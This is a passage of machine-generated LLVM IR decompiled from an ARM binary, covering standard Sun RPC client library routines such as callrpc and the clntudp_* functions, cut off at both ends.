  uselistorder i32 %v0_162fc, { 1, 0 }
  uselistorder i32 %v3_163084, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_162f4, { 1, 0 }
}

define i32 @__rpc_thread_clnt_cleanup(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16324 = load i32, i32* @r4, align 4
  store i32 %v3_16324, i32* %stack_var_-8, align 4
  %v6_16324 = load i32, i32* @lr, align 4
  %v0_16328 = call i32 @__rpc_thread_variables()
  %v1_1632c = add i32 %v0_16328, 164
  %v2_1632c = inttoptr i32 %v1_1632c to i32*
  %v3_1632c = load i32, i32* %v2_1632c, align 4
  store i32 %v3_1632c, i32* %r4.global-to-local, align 4
  %v2_16330 = icmp eq i32 %v3_1632c, 0
  br i1 %v2_16330, label %bb, label %bb5

bb:                                               ; preds = %entry
  %v3_16334 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_16334, i32* @r4, align 4
  ret i32 %v0_16328

bb5:                                              ; preds = %entry
  %v1_16338 = inttoptr i32 %v3_1632c to i32*
  %v2_16338 = load i32, i32* %v1_16338, align 4
  %v2_1633c = icmp eq i32 %v2_16338, 0
  br i1 %v2_1633c, label %.thread1, label %bb6

bb6:                                              ; preds = %bb5
  %v2_16344 = add i32 %v2_16338, 4
  %v3_16344 = inttoptr i32 %v2_16344 to i32*
  %v4_16344 = load i32, i32* %v3_16344, align 4
  %v2_1634c = add i32 %v4_16344, 16
  %v3_1634c = inttoptr i32 %v2_1634c to i32*
  %v4_1634c = load i32, i32* %v3_1634c, align 4
  call void @__pseudo_branch(i32 %v4_1634c)
  %v0_16350.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %bb5, %bb6
  %v0_16350 = phi i32 [ %v3_1632c, %bb5 ], [ %v0_16350.pre, %bb6 ]
  store i32 %v0_16350, i32* @r0, align 4
  %v2_16354 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16354, i32* @r4, align 4
  store i32 %v6_16324, i32* @lr, align 4
  %v0_16358 = call i32 @free()
  ret i32 %v0_16358

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @callrpc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-1132 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v21_16360 = load i32, i32* @sl, align 4
  store i32 90984, i32* %stack_var_-4, align 4
  %v2_16364 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_16364, i32* @fp, align 4
  %v0_1637c = call i32 @__rpc_thread_variables()
  store i32 %v0_1637c, i32* %r0.global-to-local, align 4
  %v1_16380 = add i32 %v0_1637c, 164
  %v2_16380 = inttoptr i32 %v1_16380 to i32*
  %v3_16380 = load i32, i32* %v2_16380, align 4
  store i32 %v3_16380, i32* @r5, align 4
  store i32 0, i32* @r7, align 4
  store i32 0, i32* @r8, align 4
  %v2_1638c = icmp eq i32 %v3_16380, 0
  store i32 %v0_1637c, i32* @r4, align 4
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @sl, align 4
  br i1 %v2_1638c, label %dec_label_pc_163a0, label %dec_label_pc_163bc

dec_label_pc_163a0:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_163a8 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_163a8, i32* %r0.global-to-local, align 4
  store i32 %v2_163a8, i32* @r5, align 4
  %v2_163ac = icmp eq i32 %v2_163a8, 0
  br i1 %v2_163ac, label %bb, label %dec_label_pc_163b8

bb:                                               ; preds = %dec_label_pc_163a0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_165c0

dec_label_pc_163b8:                               ; preds = %dec_label_pc_163a0
  %v1_163b8 = load i32, i32* @r4, align 4
  %v2_163b8 = add i32 %v1_163b8, 164
  %v3_163b8 = inttoptr i32 %v2_163b8 to i32*
  store i32 %v2_163a8, i32* %v3_163b8, align 4
  %v0_163bc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_163bc

dec_label_pc_163bc:                               ; preds = %entry, %dec_label_pc_163b8
  %v0_163bc = phi i32 [ %v3_16380, %entry ], [ %v0_163bc.pre, %dec_label_pc_163b8 ]
  %v1_163bc = add i32 %v0_163bc, 20
  %v2_163bc = inttoptr i32 %v1_163bc to i32*
  %v3_163bc = load i32, i32* %v2_163bc, align 4
  store i32 %v3_163bc, i32* @r4, align 4
  %v2_163c0 = icmp eq i32 %v3_163bc, 0
  br i1 %v2_163c0, label %dec_label_pc_163c8, label %dec_label_pc_163e0

dec_label_pc_163c8:                               ; preds = %dec_label_pc_163bc
  store i32 256, i32* %r0.global-to-local, align 4
  %v1_163cc = call i32 @malloc(i32 256)
  %v2_163cc = inttoptr i32 %v1_163cc to i8*
  store i32 %v1_163cc, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_163d4 = load i32, i32* @r5, align 4
  %v3_163d4 = add i32 %v2_163d4, 20
  %v4_163d4 = inttoptr i32 %v3_163d4 to i32*
  store i32 %v1_163cc, i32* %v4_163d4, align 4
  %v0_163d8 = load i32, i32* @r4, align 4
  %v1_163d8 = trunc i32 %v0_163d8 to i8
  store i8 %v1_163d8, i8* %v2_163cc, align 1
  %v0_163dc = load i32, i32* %r3.global-to-local, align 4
  %v1_163dc = load i32, i32* @r5, align 4
  %v2_163dc = add i32 %v1_163dc, 4
  %v3_163dc = inttoptr i32 %v2_163dc to i32*
  store i32 %v0_163dc, i32* %v3_163dc, align 4
  %v0_163e0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_163e0

dec_label_pc_163e0:                               ; preds = %dec_label_pc_163bc, %dec_label_pc_163c8
  %v0_1640c = phi i32 [ %v0_163bc, %dec_label_pc_163bc ], [ %v0_163e0.pre, %dec_label_pc_163c8 ]
  %v1_163e0 = add i32 %v0_1640c, 16
  %v2_163e0 = inttoptr i32 %v1_163e0 to i32*
  %v3_163e0 = load i32, i32* %v2_163e0, align 4
  store i32 %v3_163e0, i32* %r3.global-to-local, align 4
  %v2_163e4 = icmp eq i32 %v3_163e0, 0
  br i1 %v2_163e4, label %dec_label_pc_16420, label %dec_label_pc_163ec

dec_label_pc_163ec:                               ; preds = %dec_label_pc_163e0
  %v1_163ec = add i32 %v0_1640c, 8
  %v2_163ec = inttoptr i32 %v1_163ec to i32*
  %v3_163ec = load i32, i32* %v2_163ec, align 4
  store i32 %v3_163ec, i32* %r3.global-to-local, align 4
  %v9_163f4 = icmp eq i32 %v3_163ec, %arg2
  br i1 %v9_163f4, label %dec_label_pc_163fc, label %dec_label_pc_16420

dec_label_pc_163fc:                               ; preds = %dec_label_pc_163ec
  %v1_163fc = add i32 %v0_1640c, 12
  %v2_163fc = inttoptr i32 %v1_163fc to i32*
  %v3_163fc = load i32, i32* %v2_163fc, align 4
  store i32 %v3_163fc, i32* %r3.global-to-local, align 4
  %v9_16404 = icmp eq i32 %v3_163fc, %arg3
  br i1 %v9_16404, label %dec_label_pc_1640c, label %dec_label_pc_16420

dec_label_pc_1640c:                               ; preds = %dec_label_pc_163fc
  %v1_1640c = add i32 %v0_1640c, 20
  %v2_1640c = inttoptr i32 %v1_1640c to i32*
  %v3_1640c = load i32, i32* %v2_1640c, align 4
  store i32 %v3_1640c, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_16414 = inttoptr i32 %v3_1640c to i8*
  %v3_16414 = call i32 @__GI_strcoll(i8* %v2_16414, i32 %arg1)
  store i32 %v3_16414, i32* %r0.global-to-local, align 4
  %v2_16418 = icmp eq i32 %v3_16414, 0
  br i1 %v2_16418, label %dec_label_pc_16574, label %dec_label_pc_1640c.dec_label_pc_16420_crit_edge

dec_label_pc_1640c.dec_label_pc_16420_crit_edge:  ; preds = %dec_label_pc_1640c
  %v0_16420.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16420

dec_label_pc_16420:                               ; preds = %dec_label_pc_1640c.dec_label_pc_16420_crit_edge, %dec_label_pc_163fc, %dec_label_pc_163ec, %dec_label_pc_163e0
  %v1_1642c = phi i32 [ %v0_16420.pre, %dec_label_pc_1640c.dec_label_pc_16420_crit_edge ], [ %v0_1640c, %dec_label_pc_163fc ], [ %v0_1640c, %dec_label_pc_163ec ], [ %v0_1640c, %dec_label_pc_163e0 ]
  %v1_16420 = add i32 %v1_1642c, 4
  %v2_16420 = inttoptr i32 %v1_16420 to i32*
  %v3_16420 = load i32, i32* %v2_16420, align 4
  store i32 %v3_16420, i32* @r0, align 4
  store i32 0, i32* @r4, align 4
  %v7_16428 = icmp eq i32 %v3_16420, -1
  %v2_1642c = add i32 %v1_1642c, 16
  %v3_1642c = inttoptr i32 %v2_1642c to i32*
  store i32 0, i32* %v3_1642c, align 4
  br i1 %v7_16428, label %dec_label_pc_16440, label %dec_label_pc_16434

dec_label_pc_16434:                               ; preds = %dec_label_pc_16420
  %v1_16434 = call i32 @__libc_close(i32 %v3_16420)
  store i32 %v1_16434, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1643c = load i32, i32* @r5, align 4
  %v2_1643c = add i32 %v1_1643c, 4
  %v3_1643c = inttoptr i32 %v2_1643c to i32*
  store i32 -1, i32* %v3_1643c, align 4
  br label %dec_label_pc_16440

dec_label_pc_16440:                               ; preds = %dec_label_pc_16420, %dec_label_pc_16434
  %v0_16440 = load i32, i32* @r5, align 4
  %v1_16440 = inttoptr i32 %v0_16440 to i32*
  %v2_16440 = load i32, i32* %v1_16440, align 4
  store i32 %v2_16440, i32* %r3.global-to-local, align 4
  %v2_16444 = icmp eq i32 %v2_16440, 0
  br i1 %v2_16444, label %dec_label_pc_16460, label %dec_label_pc_1644c

dec_label_pc_1644c:                               ; preds = %dec_label_pc_16440
  store i32 %v2_16440, i32* %r0.global-to-local, align 4
  %v1_16450 = add i32 %v2_16440, 4
  %v2_16450 = inttoptr i32 %v1_16450 to i32*
  %v3_16450 = load i32, i32* %v2_16450, align 4
  store i32 %v3_16450, i32* %r3.global-to-local, align 4
  store i32 91228, i32* @lr, align 4
  %v1_16458 = add i32 %v3_16450, 16
  %v2_16458 = inttoptr i32 %v1_16458 to i32*
  %v3_16458 = load i32, i32* %v2_16458, align 4
  call void @__pseudo_branch(i32 %v3_16458)
  %v0_1645c = load i32, i32* @r4, align 4
  %v1_1645c = load i32, i32* @r5, align 4
  %v2_1645c = inttoptr i32 %v1_1645c to i32*
  store i32 %v0_1645c, i32* %v2_1645c, align 4
  br label %dec_label_pc_16460

dec_label_pc_16460:                               ; preds = %dec_label_pc_16440, %dec_label_pc_1644c
  %v2_16468 = ptrtoint i32* %stack_var_-1132 to i32
  store i32 1024, i32* @r4, align 4
  br label %dec_label_pc_164a0

dec_label_pc_16474:                               ; preds = %dec_label_pc_164a0, %dec_label_pc_164cc
  %v3_16474 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_16474, i32* %r3.global-to-local, align 4
  %v3_16478 = icmp eq i32 %v3_16474, -1
  br i1 %v3_16478, label %dec_label_pc_16480, label %dec_label_pc_165bc

dec_label_pc_16480:                               ; preds = %dec_label_pc_16474
  %v0_16480 = call i32 @__errno_location()
  store i32 %v0_16480, i32* %r0.global-to-local, align 4
  %v1_16484 = inttoptr i32 %v0_16480 to i32*
  %v2_16484 = load i32, i32* %v1_16484, align 4
  store i32 %v2_16484, i32* %r3.global-to-local, align 4
  %v7_16488 = icmp eq i32 %v2_16484, 34
  br i1 %v7_16488, label %dec_label_pc_16490, label %dec_label_pc_165bc

dec_label_pc_16490:                               ; preds = %dec_label_pc_16480
  %v0_16490 = load i32, i32* @r4, align 4
  %v1_16490 = add i32 %v0_16490, 6
  %v1_16494 = and i32 %v1_16490, -4
  store i32 %v1_16494, i32* %r3.global-to-local, align 4
  %v1_16498 = load i32, i32* @sp, align 4
  %v2_16498 = sub i32 %v1_16498, %v1_16494
  %v1_1649c = add i32 %v2_16498, 16
  br label %dec_label_pc_164a0

dec_label_pc_164a0:                               ; preds = %dec_label_pc_16460, %dec_label_pc_16490
  %v2_164bc = phi i32 [ %v2_16468, %dec_label_pc_16460 ], [ %v1_1649c, %dec_label_pc_16490 ]
  %v0_164a4 = phi i32 [ 1024, %dec_label_pc_16460 ], [ %v0_16490, %dec_label_pc_16490 ]
  store i32 %v0_164a4, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v7_164bc = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull %stack_var_-88, i32 %v2_164bc, i32 %v0_164a4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_164bc, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v7_164bc, 16777216
  %v1_164c0 = sdiv i32 %sext, 16777216
  store i32 %v1_164c0, i32* @r6, align 4
  %sext.off = or i32 %sext, 16777215
  %tmp = icmp ult i32 %sext.off, 33554431
  %v0_164c4 = load i32, i32* @r4, align 4
  %v2_164c4 = mul i32 %v0_164c4, 2
  store i32 %v2_164c4, i32* @r4, align 4
  br i1 %tmp, label %dec_label_pc_164cc, label %dec_label_pc_16474

dec_label_pc_164cc:                               ; preds = %dec_label_pc_164a0
  %v3_164cc = load i32, i32* %stack_var_-48, align 4
  %v2_164d0 = icmp eq i32 %v3_164cc, 0
  br i1 %v2_164d0, label %dec_label_pc_16474, label %dec_label_pc_164d8

dec_label_pc_164d8:                               ; preds = %dec_label_pc_164cc
  %v1_164d8 = add i32 %v3_164cc, 16
  %v2_164d8 = inttoptr i32 %v1_164d8 to i32*
  %v3_164d8 = load i32, i32* %v2_164d8, align 4
  store i32 %v3_164d8, i32* %r3.global-to-local, align 4
  %v2_164dc = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_164dc, i32* @r4, align 4
  %v1_164e0 = inttoptr i32 %v3_164d8 to i32*
  %v2_164e0 = load i32, i32* %v1_164e0, align 4
  store i32 %v2_164e0, i32* @r1, align 4
  %v1_164e4 = add i32 %v3_164cc, 12
  %v2_164e4 = inttoptr i32 %v1_164e4 to i32*
  %v3_164e4 = load i32, i32* %v2_164e4, align 4
  store i32 %v3_164e4, i32* @r2, align 4
  store i32 5, i32* @r7, align 4
  %v2_164ec = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_164ec, i32* @r0, align 4
  %v0_164f0 = call i32 @memcpy()
  %v0_164f4 = load i32, i32* @r5, align 4
  %v1_164f4 = add i32 %v0_164f4, 4
  store i32 %v1_164f4, i32* @lr, align 4
  %v0_164fc = load i32, i32* @r7, align 4
  store i32 %v0_164fc, i32* %r3.global-to-local, align 4
  store i32 %v2_164dc, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 2, i32* %stack_var_-68, align 4
  %v0_16520 = load i32, i32* @r6, align 4
  %v7_16524 = call i32 @__GI_clntudp_create(i32 %v2_164dc, i32 %arg2, i32 %arg3, i32 %v0_164fc, i32 %v0_16520, i32 %v1_164f4)
  store i32 %v7_16524, i32* %r0.global-to-local, align 4
  %v2_16528 = icmp eq i32 %v7_16524, 0
  %v1_16530 = load i32, i32* @r5, align 4
  %v2_16530 = inttoptr i32 %v1_16530 to i32*
  store i32 %v7_16524, i32* %v2_16530, align 4
  br i1 %v2_16528, label %dec_label_pc_16538, label %dec_label_pc_16544

dec_label_pc_16538:                               ; preds = %dec_label_pc_164d8
  %v0_16538 = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_16538, i32* %r0.global-to-local, align 4
  %v1_1653c = inttoptr i32 %v0_16538 to i32*
  %v2_1653c = load i32, i32* %v1_1653c, align 4
  store i32 %v2_1653c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_165c0

dec_label_pc_16544:                               ; preds = %dec_label_pc_164d8
  %v1_16548 = load i32, i32* @r5, align 4
  %v2_16548 = add i32 %v1_16548, 16
  %v3_16548 = inttoptr i32 %v2_16548 to i32*
  store i32 1, i32* %v3_16548, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v1_16550 = load i32, i32* @r5, align 4
  %v2_16550 = add i32 %v1_16550, 8
  %v3_16550 = inttoptr i32 %v2_16550 to i32*
  store i32 %arg2, i32* %v3_16550, align 4
  %v1_16558 = load i32, i32* @r5, align 4
  %v2_16558 = add i32 %v1_16558, 12
  %v3_16558 = inttoptr i32 %v2_16558 to i32*
  store i32 %arg3, i32* %v3_16558, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_16560 = load i32, i32* @r5, align 4
  %v1_16560 = add i32 %v0_16560, 20
  %v2_16560 = inttoptr i32 %v1_16560 to i32*
  %v3_16560 = load i32, i32* %v2_16560, align 4
  store i32 %v3_16560, i32* %r0.global-to-local, align 4
  %v3_16568 = call i32 @strncpy(i32 %v3_16560, i32 %arg1, i32 255)
  store i32 %v3_16568, i32* %r0.global-to-local, align 4
  %v0_1656c = load i32, i32* @r5, align 4
  %v1_1656c = add i32 %v0_1656c, 20
  %v2_1656c = inttoptr i32 %v1_1656c to i32*
  %v3_1656c = load i32, i32* %v2_1656c, align 4
  store i32 %v3_1656c, i32* %r3.global-to-local, align 4
  %v0_16570 = load i32, i32* @r6, align 4
  %v1_16570 = trunc i32 %v0_16570 to i8
  %v3_16570 = add i32 %v3_1656c, 255
  %v4_16570 = inttoptr i32 %v3_16570 to i8*
  store i8 %v1_16570, i8* %v4_16570, align 1
  br label %dec_label_pc_16574

dec_label_pc_16574:                               ; preds = %dec_label_pc_1640c, %dec_label_pc_16544
  %v0_16574 = load i32, i32* @r5, align 4
  %v1_16574 = inttoptr i32 %v0_16574 to i32*
  %v2_16574 = load i32, i32* %v1_16574, align 4
  %v1_16578 = add i32 %v2_16574, 4
  %v2_16578 = inttoptr i32 %v1_16578 to i32*
  %v3_16578 = load i32, i32* %v2_16578, align 4
  store i32 %v2_16574, i32* %r0.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v1_165ac = inttoptr i32 %v3_16578 to i32*
  %v2_165ac = load i32, i32* %v1_165ac, align 4
  call void @__pseudo_branch(i32 %v2_165ac)
  %v0_165b0 = load i32, i32* %r0.global-to-local, align 4
  %v2_165b0 = icmp eq i32 %v0_165b0, 0
  br i1 %v2_165b0, label %dec_label_pc_165c0, label %bb41

bb41:                                             ; preds = %dec_label_pc_16574
  %v1_165b4 = load i32, i32* %sl.global-to-local, align 4
  %v2_165b4 = load i32, i32* @r5, align 4
  %v3_165b4 = add i32 %v2_165b4, 16
  %v4_165b4 = inttoptr i32 %v3_165b4 to i32*
  store i32 %v1_165b4, i32* %v4_165b4, align 4
  %v30_165c4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_165c0

dec_label_pc_165bc:                               ; preds = %dec_label_pc_16480, %dec_label_pc_16474
  store i32 13, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_165c0

dec_label_pc_165c0:                               ; preds = %bb, %bb41, %dec_label_pc_16574, %dec_label_pc_16538, %dec_label_pc_165bc
  %v30_165c4 = phi i32 [ %v30_165c4.pre, %bb41 ], [ 0, %dec_label_pc_16574 ], [ 0, %bb ], [ %v2_1653c, %dec_label_pc_16538 ], [ 13, %dec_label_pc_165bc ]
  store i32 %v21_16360, i32* %sl.global-to-local, align 4
  ret i32 %v30_165c4

; uselistorder directives
  uselistorder i32 %v0_164a4, { 1, 0 }
  uselistorder i32 %v2_16440, { 1, 0, 2, 3 }
  uselistorder i32 %v3_16420, { 1, 0, 2 }
  uselistorder i32 %v1_163cc, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 9, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 8, 10, 9, 14, 12, 11, 13, 15, 17, 16, 20, 18, 19, 22, 21, 23, 0 }
  uselistorder i32 %arg3, { 1, 3, 2, 0 }
  uselistorder i32 %arg2, { 2, 1, 4, 3, 0 }
  uselistorder i32 %arg1, { 3, 2, 5, 4, 1, 0, 6 }
  uselistorder label %dec_label_pc_165c0, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_16574, { 1, 0 }
  uselistorder label %dec_label_pc_164a0, { 1, 0 }
  uselistorder label %dec_label_pc_16474, { 1, 0 }
  uselistorder label %dec_label_pc_16460, { 1, 0 }
  uselistorder label %dec_label_pc_16440, { 1, 0 }
  uselistorder label %dec_label_pc_163e0, { 1, 0 }
  uselistorder label %dec_label_pc_163bc, { 1, 0 }
}

define i32 @clntudp_geterr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_165c8 = add i32 %arg1, 8
  %v2_165c8 = inttoptr i32 %v1_165c8 to i32*
  %v3_165c8 = load i32, i32* %v2_165c8, align 4
  %v1_165cc = add i32 %v3_165c8, 44
  %v1_165d4 = inttoptr i32 %v1_165cc to i32*
  %v2_165d4 = load i32, i32* %v1_165d4, align 4
  %v3_165d4 = add i32 %v3_165c8, 48
  %v4_165d4 = inttoptr i32 %v3_165d4 to i32*
  %v5_165d4 = load i32, i32* %v4_165d4, align 4
  store i32 %v5_165d4, i32* %r1.global-to-local, align 4
  %v6_165d4 = add i32 %v3_165c8, 52
  %v7_165d4 = inttoptr i32 %v6_165d4 to i32*
  %v8_165d4 = load i32, i32* %v7_165d4, align 4
  store i32 %v8_165d4, i32* %r2.global-to-local, align 4
  store i32 %v2_165d4, i32* %arg2, align 4
  %v3_165d8 = add i32 %tmp, 4
  %v4_165d8 = inttoptr i32 %v3_165d8 to i32*
  %v5_165d8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_165d8, i32* %v4_165d8, align 4
  %v6_165d8 = add i32 %tmp, 8
  %v7_165d8 = inttoptr i32 %v6_165d8 to i32*
  %v8_165d8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_165d8, i32* %v7_165d8, align 4
  ret i32 %v2_165d4

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
}

define i32 @clntudp_freeres(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_165e4 = add i32 %arg1, 8
  %v2_165e4 = inttoptr i32 %v1_165e4 to i32*
  %v3_165e4 = load i32, i32* %v2_165e4, align 4
  store i32 %v3_165e4, i32* %r0.global-to-local, align 4
  %v2_165ec = add i32 %v3_165e4, 56
  %v3_165ec = inttoptr i32 %v2_165ec to i32*
  store i32 2, i32* %v3_165ec, align 4
  %v0_165f4 = load i32, i32* %r0.global-to-local, align 4
  %v1_165f4 = add i32 %v0_165f4, 56
  store i32 %v1_165f4, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg2)
  ret i32 %v1_165f4

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
}

define i32 @clntudp_abort() local_unnamed_addr {
entry:
  %v1_16608 = load i32, i32* @r0, align 4
  ret i32 %v1_16608
}

define i32 @clntudp_control(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_16610 = add i32 %arg2, -1
  %tmp = icmp ult i32 %v1_16610, 15
  br i1 %tmp, label %bb, label %dec_label_pc_16664

bb:                                               ; preds = %entry
  %v7_16620 = mul i32 %v1_16610, 4
  %v8_16620 = add i32 %v7_16620, ptrtoint (i32* @global_var_16628.858 to i32)
  %v9_16620 = inttoptr i32 %v8_16620 to i32*
  %v10_16620 = load i32, i32* %v9_16620, align 4
  call void @__pseudo_branch(i32 %v10_16620)
  br label %dec_label_pc_16664

dec_label_pc_16664:                               ; preds = %bb, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_16610, { 1, 0 }
}

define i32 @__GI_clntudp_bufcreate(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %v6_167d4 = load i32, i32* @r5, align 4
  %v9_167d4 = load i32, i32* @r6, align 4
  %v12_167d4 = load i32, i32* @r7, align 4
  %v15_167d4 = load i32, i32* @r8, align 4
  %v18_167d4 = load i32, i32* @sb, align 4
  %v21_167d4 = load i32, i32* @sl, align 4
  %v24_167d4 = load i32, i32* @fp, align 4
  %v27_167d4 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 12, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @fp, align 4
  store i32 %arg6, i32* @sb, align 4
  %v1_167f4 = call i32 @malloc(i32 12)
  %v1_167fc = add i32 %arg7, 3
  %v1_16800 = and i32 %v1_167fc, -4
  store i32 %v1_16800, i32* @r8, align 4
  %v1_16808 = add i32 %arg8, 3
  store i32 %v1_16808, i32* %r3.global-to-local, align 4
  store i32 %v1_167f4, i32* @r6, align 4
  %v1_16810 = and i32 %v1_16808, -4
  store i32 %v1_16810, i32* @r7, align 4
  %v1_16814 = add i32 %v1_16800, 100
  %v2_16818 = add i32 %v1_16814, %v1_16810
  store i32 %v2_16818, i32* %r0.global-to-local, align 4
  %v1_1681c = call i32 @malloc(i32 %v2_16818)
  store i32 %v1_1681c, i32* %r0.global-to-local, align 4
  %v2_16820 = icmp eq i32 %v1_1681c, 0
  br i1 %v2_16820, label %.thread3, label %bb

bb:                                               ; preds = %entry
  %v1_16824 = load i32, i32* @r6, align 4
  %v3_16824 = icmp eq i32 %v1_16824, 0
  store i32 %v1_1681c, i32* @r5, align 4
  br i1 %v3_16824, label %dec_label_pc_16838, label %dec_label_pc_16860

.thread3:                                         ; preds = %entry
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_16838

dec_label_pc_16838:                               ; preds = %bb, %.thread3
  %v0_16838 = call i32 @__GI___rpc_thread_createerr()
  store i32 177520, i32* %r3.global-to-local, align 4
  store i32 %v0_16838, i32* @r4, align 4
  %v2_16844 = load i32, i32* @global_var_2b570, align 4
  store i32 ptrtoint ([31 x i8]* @global_var_1e8f4.861 to i32), i32* %r0.global-to-local, align 4
  %v3_1684c = call i32 @__GI_fputs(i32 ptrtoint ([31 x i8]* @global_var_1e8f4.861 to i32), i32 %v2_16844)
  store i32 %v3_1684c, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v1_16854 = load i32, i32* @r4, align 4
  %v2_16854 = add i32 %v1_16854, 8
  %v3_16854 = inttoptr i32 %v2_16854 to i32*
  store i32 12, i32* %v3_16854, align 4
  %v0_16858 = load i32, i32* %r3.global-to-local, align 4
  %v1_16858 = load i32, i32* @r4, align 4
  %v2_16858 = inttoptr i32 %v1_16858 to i32*
  store i32 %v0_16858, i32* %v2_16858, align 4
  br label %dec_label_pc_169f8

dec_label_pc_16860:                               ; preds = %bb
  store i32 0, i32* @sl, align 4
  %v1_16860 = add i32 %v1_1681c, 96
  %v1_16864 = load i32, i32* @r7, align 4
  %v2_16864 = add i32 %v1_16860, %v1_16864
  store i32 %v2_16864, i32* %r3.global-to-local, align 4
  %v2_16868 = add i32 %v1_1681c, 88
  %v3_16868 = inttoptr i32 %v2_16868 to i32*
  store i32 %v2_16864, i32* %v3_16868, align 4
  %v0_1686c = load i32, i32* @r4, align 4
  %v1_1686c = add i32 %v0_1686c, 2
  %v2_1686c = inttoptr i32 %v1_1686c to i8*
  %v3_1686c = load i8, i8* %v2_1686c, align 1
  %v4_1686c = zext i8 %v3_1686c to i32
  store i32 %v4_1686c, i32* %r2.global-to-local, align 4
  %v1_16870 = add i32 %v0_1686c, 3
  %v2_16870 = inttoptr i32 %v1_16870 to i8*
  %v3_16870 = load i8, i8* %v2_16870, align 1
  %v4_16870 = zext i8 %v3_16870 to i32
  %v4_16874 = mul nuw nsw i32 %v4_16870, 256
  %v5_16874 = or i32 %v4_16874, %v4_1686c
  store i32 %v5_16874, i32* %r3.global-to-local, align 4
  %v7_16874 = icmp eq i32 %v5_16874, 0
  br i1 %v7_16874, label %dec_label_pc_1687c, label %dec_label_pc_168b4

dec_label_pc_1687c:                               ; preds = %dec_label_pc_16860
